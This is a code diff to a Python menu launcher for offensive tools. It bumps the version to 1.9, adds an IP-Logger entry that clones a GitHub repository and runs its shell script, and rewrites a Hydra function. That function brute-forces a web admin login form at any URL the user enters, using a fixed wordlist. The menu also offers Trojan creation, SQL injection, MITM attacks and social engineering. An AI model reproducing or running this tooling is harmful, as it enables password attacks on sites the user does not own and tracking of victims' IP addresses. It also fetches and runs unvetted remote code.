@@ -303,7 +303,19 @@ def ZusyFramework():
         run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)
     else:
         run("cd .. && git clone https://github.com/NoNameZusy/ZusyFramework.git", shell=True)
-        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)        
+        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)   
+        
+def iplogger():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"IP-Logger running...")
+    time.sleep(0.5)
+    clear_screen()
+    if os.path.isdir("IP-Logger"):
+        run("cd .. && cd IP-Logger && bash iplogger.sh", shell=True)
+    else:
+        run("cd .. && git clone https://github.com/NoNameZusy/IP-Logger.git", shell=True)
+        run("cd .. && cd IP-Logger && bash iplogger.sh", shell=True)   
+             
         
 def No_Escape():
     time.sleep(0.5)
@@ -336,26 +348,19 @@ def social_engineering():
     run("setoolkit", shell=True)
     
 def hydra():
-    try:
-        time.sleep(0.5)
-        print(Fore.BLUE + "[Status] " + Fore.WHITE + "Hydra running...")
-        time.sleep(0.5)
-        os.system('clear')
-        user_admin_name = input("Username: ")
-        user_password = input("Password: ")
-        website_url = input("Panel URL: ")
-        website_file = input("File Extension (ex. /login/admin.php/): ")
-        time.sleep(0.5)
-        print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
-        time.sleep(1)
-        command = f"hydra -l {user_admin_name} -P {user_password} {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I"
-        result = run(command, shell=True, capture_output=True, text=True)
-        print(result.stdout)
-        if result.stderr:
-            print(Fore.RED + "" + result.stderr + Fore.WHITE)
-        
-    except Exception as e:
-        print(Fore.RED + f"{e}" + Fore.WHITE)
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Hydra running...")
+    time.sleep(0.5)
+    os.system('clear')
+    user_admin_name = input("Username: ")
+    user_password = input("Password: ")
+    website_url = input("Panel URL: ")
+    website_file = input("File Extension (ex. /login/admin.php/): ")
+
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
+    time.sleep(1)
+    run(f"hydra -l {user_admin_name} -P /root/Desktop/wordlist.txt {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I", shell=True)
 
 def bettercap():
     time.sleep(0.5)
@@ -386,10 +391,10 @@ def main_menu():
       ╔╝═╚═╣╚═╝║╚═╝║─║║──
       ╚════╩═══╩═══╝─╚╝──
 -------{ By No_Name.exe }-------
-                        v 1.8
+                        v 1.9
     """
     print(logo)
-    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[21] Hydra\n[22] Bettercap\n[23] Wireshark\n[99] Exit\n"
+    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[21] Hydra\n[22] Bettercap\n[23] Wireshark\n[24] IP-Logger\n[99] Exit\n"
     "\n[100] Update\n[101] Info\n")
     choice = input("Zusy ~$ ")
     if choice == "1":
@@ -437,7 +442,9 @@ def main_menu():
     elif choice == "22":
         bettercap()
     elif choice == "23":
-        wireshark()                             
+        wireshark()   
+    elif choice == "24":
+        iplogger()                          
     elif choice == "100":
         update_tool()
     elif choice == "101":
